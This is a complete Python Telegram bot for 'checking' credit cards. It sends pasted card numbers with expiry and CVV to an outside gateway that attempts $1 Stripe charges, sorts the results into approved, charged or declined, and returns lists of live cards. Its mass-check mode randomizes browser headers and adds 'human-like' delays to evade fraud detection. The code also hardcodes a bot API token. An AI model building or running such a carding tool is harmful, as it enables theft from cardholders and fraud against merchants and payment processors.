import aiohttp
import asyncio
import logging
import json
import random
import time
from aiogram import Bot, Dispatcher, types
from aiogram.types import FSInputFile
from aiogram.filters import Command
from fake_useragent import UserAgent
import hashlib
from datetime import datetime
from colorama import init, Fore, Back, Style

# Initialize colorama for colored console output
init(autoreset=True)

# ---- Config ----
API_TOKEN = "8224235130:AAHEg-BerzoVz-rpewEGSum8-es2YT50AFo"
bot = Bot(token=API_TOKEN)
dp = Dispatcher()

# Initialize UserAgent for random headers
ua = UserAgent()

# Default settings
DEFAULT_AMOUNT = 1
DEFAULT_LIMIT = 20
current_limit = DEFAULT_LIMIT

# Response categories
approved_keywords = [
    "APPROVED", "SUCCESS", "SUCCEEDED", "1000", "2001", "2010", "2011",
    "INSUFFICIENT_FUNDS", "INSUFFICIENT FUNDS"
]

charged_keywords = [
    "CHARGED", "PAYMENT_CAPTURED", "PAYMENT_SUCCESS", "0000", "THANK_YOU", "THANK YOU"
]

declined_keywords = [
    "DECLINED", "CARD_DECLINED", "GENERIC_DECLINE", "DO_NOT_HONOR",
    "YOUR CARD WAS DECLINED", "CARD WAS DECLINED",
    "LOST_CARD", "STOLEN_CARD", "EXPIRED_CARD",
    "INCORRECT_CVC", "PROCESSING_ERROR", "INCORRECT_NUMBER",
    "FAILED", "ERROR", "REJECTED", "REFUSED"
]

# Session storage
sessions_data = {}

# Country flag emojis
country_flags = {
    "US": "🇺🇸", "GB": "🇬🇧", "CA": "🇨🇦", "AU": "🇦🇺", "FR": "🇫🇷",
    "DE": "🇩🇪", "IT": "🇮🇹", "ES": "🇪🇸", "BR": "🇧🇷", "MX": "🇲🇽",
    "JP": "🇯🇵", "CN": "🇨🇳", "IN": "🇮🇳", "TH": "🇹🇭", "MY": "🇲🇾",
    "SG": "🇸🇬", "HK": "🇭🇰", "KR": "🇰🇷", "ID": "🇮🇩", "PH": "🇵🇭",
    "VN": "🇻🇳", "AR": "🇦🇷", "CL": "🇨🇱", "CO": "🇨🇴", "PE": "🇵🇪",
    "ZA": "🇿🇦", "NG": "🇳🇬", "EG": "🇪🇬", "KE": "🇰🇪", "MA": "🇲🇦"
}

# Console logging functions
def console_log_request(url, headers):
    """Log API request details to console"""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    print(f"\n{Fore.CYAN}{'='*60}")
    print(f"{Fore.YELLOW}[{timestamp}] API REQUEST")
    print(f"{Fore.CYAN}{'='*60}")
    print(f"{Fore.GREEN}URL: {Fore.WHITE}{url}")
    print(f"{Fore.GREEN}User-Agent: {Fore.WHITE}{headers.get('User-Agent', 'N/A')[:50]}...")
    print(f"{Fore.CYAN}{'='*60}")

def get_random_headers():
    """Generate random browser headers"""
    headers = {
        'User-Agent': ua.random,
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': random.choice([
            'en-US,en;q=0.9',
            'en-GB,en;q=0.9',
            'en-US,en;q=0.8,es;q=0.7'
        ]),
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'keep-alive',
        'Cache-Control': 'no-cache'
    }
    return headers

def get_human_delay():
    """Generate human-like random delay"""
    return random.uniform(5, 10)

# ---- BIN Lookup Function ----
async def lookup_bin(bin_number):
    """Lookup BIN information from binlist.net"""
    try:
        url = f"https://lookup.binlist.net/{bin_number}"
        async with aiohttp.ClientSession() as session:
            headers = {'Accept-Version': '3'}
            async with session.get(url, headers=headers, timeout=10) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    
                    # Extract information
                    scheme = data.get('scheme', 'N/A').upper()
                    card_type = data.get('type', 'N/A').upper()
                    brand = data.get('brand', 'N/A').upper()
                    bank = data.get('bank', {}).get('name', 'N/A').upper()
                    country_name = data.get('country', {}).get('name', 'N/A').upper()
                    country_code = data.get('country', {}).get('alpha2', '')
                    currency = data.get('country', {}).get('currency', 'N/A')
                    flag = country_flags.get(country_code, '🏳️')
                    
                    return {
                        "scheme": scheme,
                        "type": card_type,
                        "brand": brand,
                        "bank": bank,
                        "country": country_name,
                        "flag": flag,
                        "currency": currency
                    }
                else:
                    print(f"{Fore.RED}[BIN LOOKUP] Failed: {resp.status}")
                    return None
    except Exception as e:
        print(f"{Fore.RED}[BIN ERROR] {str(e)}")
        return None

# ---- API Request ----
async def check_cc(cc, session_id=None):
    # Build URL
    url = f"https://stripe-charge.stormx.pw/index.cpp?key=dark&cc={cc}&amount={DEFAULT_AMOUNT}"
    
    # Get BIN (first 6 digits)
    bin_number = cc.split('|')[0][:6]
    
    # Generate session ID
    if not session_id:
        session_id = hashlib.md5(f"check_{time.time()}".encode()).hexdigest()
    
    # Start time for measuring
    start_time = time.time()
    
    try:
        timeout = aiohttp.ClientTimeout(total=30)
        
        if session_id not in sessions_data:
            sessions_data[session_id] = aiohttp.CookieJar()
        
        async with aiohttp.ClientSession(
            timeout=timeout,
            cookie_jar=sessions_data[session_id]
        ) as session:
            
            headers = get_random_headers()
            
            # Log request to console
            console_log_request(url, headers)
            
            async with session.get(url, headers=headers) as resp:
                text = await resp.text()
                
                # Calculate time taken
                time_taken = round(time.time() - start_time, 2)
                
                if resp.status != 200:
                    return {
                        "message": f"HTTP Error {resp.status}",
                        "status": "error",
                        "cc": cc,
                        "time": time_taken,
                        "bin_info": None
                    }

                # Try to parse JSON response
                try:
                    data = json.loads(text)
                    response_msg = data.get('response', data.get('message', text))
                except:
                    response_msg = text
                
                # Check response text (uppercase for comparison)
                check_text = response_msg.upper() if response_msg else ""
                
                # Determine status
                status = "declined"
                if any(keyword in check_text for keyword in approved_keywords):
                    status = "approved"
                    print(f"{Fore.GREEN}[APPROVED] {cc[:4]}**** - {response_msg}")
                elif any(keyword in check_text for keyword in charged_keywords):
                    status = "charged"
                    print(f"{Fore.YELLOW}[CHARGED] {cc[:4]}**** - {response_msg}")
                else:
                    status = "declined"
                    print(f"{Fore.RED}[DECLINED] {cc[:4]}**** - {response_msg}")
                
                # Lookup BIN info
                bin_info = await lookup_bin(bin_number)
                
                return {
                    "message": response_msg,
                    "status": status,
                    "cc": cc,
                    "time": time_taken,
                    "bin_info": bin_info
                }
                
    except asyncio.TimeoutError:
        time_taken = round(time.time() - start_time, 2)
        return {
            "message": "Request Timeout",
            "status": "error",
            "cc": cc,
            "time": time_taken,
            "bin_info": None
        }
    except Exception as e:
        time_taken = round(time.time() - start_time, 2)
        return {
            "message": f"Error: {str(e)}",
            "status": "error",
            "cc": cc,
            "time": time_taken,
            "bin_info": None
        }

# ---- Format Result Function ----
def format_result(result, username="User"):
    """Format the result in the specified style"""
    cc = result['cc']
    status = result['status']
    message = result['message']
    time_taken = result['time']
    bin_info = result['bin_info']
    
    # Status emoji and text
    if status == "approved":
        status_text = "Approved ✅"
    elif status == "charged":
        status_text = "Charged 💳"
    elif status == "declined":
        status_text = "Declined ❌"
    else:
        status_text = "Error ⚠️"
    
    # Build the formatted message
    formatted = f"""━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
𝗖𝗮𝗿𝗱 ➜ {cc}
𝐒𝐭𝐚𝐭𝐮𝐬 ➜ {status_text}
𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ➜ {message}
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━"""
    
    # Add BIN info if available
    if bin_info:
        info_text = f"{bin_info['scheme']} - {bin_info['type']} - {bin_info['brand']}"
        bank_text = bin_info['bank']
        country_text = f"{bin_info['country']} - {bin_info['flag']} - {bin_info['currency']}"
        
        formatted += f"""
𝗜𝗻𝗳𝗼 ➜ {info_text}
𝐁𝐚𝐧𝐤 ➜ {bank_text}
𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ➜ {country_text}
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━"""
    
    # Add time and user info
    formatted += f"""
𝗧𝗶𝗺𝗲 ➜ {time_taken} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬
𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲 ➜ {username} [ PREMIUM ]
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
𝐁𝐨𝐭 𝐁𝐲 ➜ 𝐂𝐲𝐛𝐨𝐫✘"""
    
    return formatted

# ---- Animated Loading Bar ----
async def show_loading_animation(message, cc):
    """Show animated loading bar"""
    loading_frames = [
        f"𝐂𝐡𝐞𝐜𝐤𝐢𝐧𝐠 ➜ ■□□□\n━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━\n𝐂𝐚𝐫𝐝 ➜ {cc}\n𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➜『 Stripe Premium Auth [ /auth ] 』",
        f"𝐂𝐡𝐞𝐜𝐤𝐢𝐧𝐠 ➜ ■■□□\n━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━\n𝐂𝐚𝐫𝐝 ➜ {cc}\n𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➜『 Stripe Premium Auth [ /auth ] 』",
        f"𝐂𝐡𝐞𝐜𝐤𝐢𝐧𝐠 ➜ ■■■□\n━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━\n𝐂𝐚𝐫𝐝 ➜ {cc}\n𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➜『 Stripe Premium Auth [ /auth ] 』",
        f"𝐂𝐡𝐞𝐜𝐤𝐢𝐧𝐠 ➜ ■■■■\n━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━\n𝐂𝐚𝐫𝐝 ➜ {cc}\n𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➜『 Stripe Premium Auth [ /auth ] 』"
    ]
    
    for frame in loading_frames[:-1]:
        await message.edit_text(frame)
        await asyncio.sleep(0.5)
    
    # Show final frame
    await message.edit_text(loading_frames[-1])
    return message

# ---- Commands ----
@dp.message(Command("cmds"))
async def cmds(message: types.Message):
    print(f"{Fore.CYAN}[COMMAND] User {message.from_user.username} used /cmds")
    cmds_list = """
📌 Available Commands:

💳 CC Checking:
/auth <cc> - Check single CC
/mass <ccs> - Check multiple CCs

⚙️ Settings:
/lt <number> - Set limit (default: 20)

📊 Other:
/cmds - Show all commands
/status - Show bot status
"""
    await message.answer(cmds_list)

# ---- Status Command ----
@dp.message(Command("status"))
async def status(message: types.Message):
    print(f"{Fore.CYAN}[COMMAND] Status requested")
    status_msg = f"""
🤖 𝐒𝐭𝐫𝐢𝐩𝐞 𝐏𝐫𝐞𝐦𝐢𝐮𝐦 𝐒𝐭𝐚𝐭𝐮𝐬:
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
💳 Gateway: Active
💵 Amount: ${DEFAULT_AMOUNT}
📝 Limit: {current_limit} cards
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
🛡️ Protection: Active
⏱️ Delay: 5-10 seconds
🔍 BIN Lookup: Enabled
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
𝐁𝐨𝐭 𝐁𝐲 ➜ 𝐂𝐲𝐛𝐨𝐫✘
"""
    await message.answer(status_msg)

# ---- Set Limit Command ----
@dp.message(Command("lt"))
async def set_limit(message: types.Message):
    global current_limit
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        await message.answer(f"⚠️ Usage: /lt <number>\nCurrent limit: {current_limit}")
        return
    
    try:
        new_limit = int(parts[1].strip())
        if 1 <= new_limit <= 100:
            current_limit = new_limit
            print(f"{Fore.GREEN}[SETTINGS] Limit set to {new_limit}")
            await message.answer(f"✅ Limit set to {new_limit} cards")
        else:
            await message.answer("⚠️ Limit must be between 1 and 100")
    except ValueError:
        await message.answer("⚠️ Invalid number. Please enter a valid number.")

# ---- Single CC Check (Auth) ----
@dp.message(Command("auth"))
async def auth(message: types.Message):
    print(f"{Fore.CYAN}[COMMAND] Auth check requested by {message.from_user.username}")
    
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        await message.answer("⚠️ Usage: /auth <cc>")
        return

    cc = parts[1].strip()
    username = message.from_user.first_name or message.from_user.username or "User"
    
    print(f"{Fore.YELLOW}[CHECKING] CC: {cc[:4]}****")
    
    # Show animated loading
    msg = await message.answer("Starting check...")
    msg = await show_loading_animation(msg, cc)
    
    # Check the card
    result = await check_cc(cc)
    
    # Format and send result
    formatted_result = format_result(result, username)
    await msg.edit_text(formatted_result)

# ---- Mass CC Check ----
@dp.message(Command("mass"))
async def mass(message: types.Message):
    print(f"{Fore.CYAN}[COMMAND] Mass check requested by {message.from_user.username}")
    
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        await message.answer("⚠️ Usage: /mass <ccs>")
        return

    ccs = parts[1].splitlines()
    username = message.from_user.first_name or message.from_user.username or "User"
    
    # Apply limit
    if len(ccs) > current_limit:
        ccs = ccs[:current_limit]
        await message.answer(f"⚠️ Limited to {current_limit} cards. Use /lt to change limit.")
    
    print(f"{Fore.YELLOW}[MASS CHECK] Starting check for {len(ccs)} cards")
    
    # Initialize counters
    approved_count = 0
    charged_count = 0
    declined_count = 0
    
    # Initialize result lists
    approved_results = []
    charged_results = []
    declined_results = []
    all_results = []
    
    msg = await message.answer(f"⏳ Starting mass check for {len(ccs)} cards...")
    
    total = len(ccs)
    session_id = hashlib.md5(f"mass_{time.time()}".encode()).hexdigest()
    
    for index, cc in enumerate(ccs, 1):
        # Delay between checks
        if index > 1:
            delay = get_human_delay()
            print(f"{Fore.CYAN}[DELAY] Waiting {delay:.1f} seconds")
            await asyncio.sleep(delay)
        
        print(f"{Fore.YELLOW}[PROGRESS] Checking card {index}/{total}")
        
        # Update progress
        progress_text = f"𝐂𝐡𝐞𝐜𝐤𝐢𝐧𝐠 ➜ Card {index}/{total}\n"
        progress_text += f"━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━\n"
        progress_text += f"✅ Approved: {approved_count}\n"
        progress_text += f"💳 Charged: {charged_count}\n"
        progress_text += f"❌ Declined: {declined_count}"
        
        await msg.edit_text(progress_text)
        
        # Check the card
        res = await check_cc(cc.strip(), session_id)
        
        # Format result
        formatted = format_result(res, username)
        all_results.append(formatted)
        
        # Update counters
        if res["status"] == "approved":
            approved_count += 1
            approved_results.append(formatted)
        elif res["status"] == "charged":
            charged_count += 1
            charged_results.append(formatted)
            # Send instant notification for charged
            await message.answer(f"💎 CHARGED CARD FOUND!\n\n{formatted}")
        else:
            declined_count += 1
            declined_results.append(formatted)
    
    # Final summary
    summary = f"""
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
✅ 𝐌𝐚𝐬𝐬 𝐂𝐡𝐞𝐜𝐤 𝐂𝐨𝐦𝐩𝐥𝐞𝐭𝐞!
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
📊 𝐓𝐨𝐭𝐚𝐥: {total}
✅ 𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝: {approved_count}
💳 𝐂𝐡𝐚𝐫𝐠𝐞𝐝: {charged_count}
❌ 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝: {declined_count}
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲 ➜ {username} [ PREMIUM ]
𝐁𝐨𝐭 𝐁𝐲 ➜ 𝐂𝐲𝐛𝐨𝐫✘
"""
    await message.answer(summary)
    
    # Save results to files
    files_to_send = []
    
    if approved_results:
        with open("approved.txt", "w", encoding='utf-8') as f:
            f.write("\n\n".join(approved_results))
        files_to_send.append(("approved.txt", f"✅ Approved: {approved_count}"))
    
    if charged_results:
        with open("charged.txt", "w", encoding='utf-8') as f:
            f.write("\n\n".join(charged_results))
        files_to_send.append(("charged.txt", f"💳 Charged: {charged_count}"))
    
    if declined_results:
        with open("declined.txt", "w", encoding='utf-8') as f:
            f.write("\n\n".join(declined_results))
        files_to_send.append(("declined.txt", f"❌ Declined: {declined_count}"))
    
    # Send files
    for filename, caption in files_to_send:
        await message.answer_document(FSInputFile(filename), caption=caption)

# ---- Start ----
@dp.message(Command("start"))
async def start(message: types.Message):
    username = message.from_user.first_name or message.from_user.username or "User"
    print(f"{Fore.CYAN}[COMMAND] Bot started by {username}")
    
    welcome_msg = f"""
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
👋 𝐖𝐞𝐥𝐜𝐨𝐦𝐞 {username}!
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
『 𝐒𝐭𝐫𝐢𝐩𝐞 𝐏𝐫𝐞𝐦𝐢𝐮𝐦 𝐀𝐮𝐭𝐡 』

🔥 𝐐𝐮𝐢𝐜𝐤 𝐒𝐭𝐚𝐫𝐭:
• Single: /auth <cc>
• Mass: /mass <ccs>

💳 𝐅𝐞𝐚𝐭𝐮𝐫𝐞𝐬:
• Live Gateway
• BIN Information
• Bank Details
• Country Info

⚙️ 𝐒𝐞𝐭𝐭𝐢𝐧𝐠𝐬:
• Limit: /lt <number>
• Current: {current_limit} cards

━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
𝐁𝐨𝐭 𝐁𝐲 ➜ 𝐂𝐲𝐛𝐨𝐫✘
"""
    await message.answer(welcome_msg)

async def main():
    logging.basicConfig(level=logging.INFO)
    
    # Console startup message
    print(f"{Fore.BLUE}{'='*60}")
    print(f"{Fore.YELLOW}🤖 Stripe Premium Auth Bot Starting...")
    print(f"{Fore.BLUE}{'='*60}")
    print(f"{Fore.GREEN}💳 Gateway: Stripe Premium Auth")
    print(f"{Fore.GREEN}💵 Amount: ${DEFAULT_AMOUNT}")
    print(f"{Fore.GREEN}📝 Default Limit: {DEFAULT_LIMIT} cards")
    print(f"{Fore.GREEN}⏱️ Delay: 5-10 seconds")
    print(f"{Fore.GREEN}🔍 BIN Lookup: Enabled")
    print(f"{Fore.GREEN}📊 Console Logging: ENABLED")
    print(f"{Fore.BLUE}{'='*60}")
    print(f"{Fore.YELLOW}✅ Bot Ready!")
    print(f"{Fore.BLUE}{'='*60}\n")
    
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
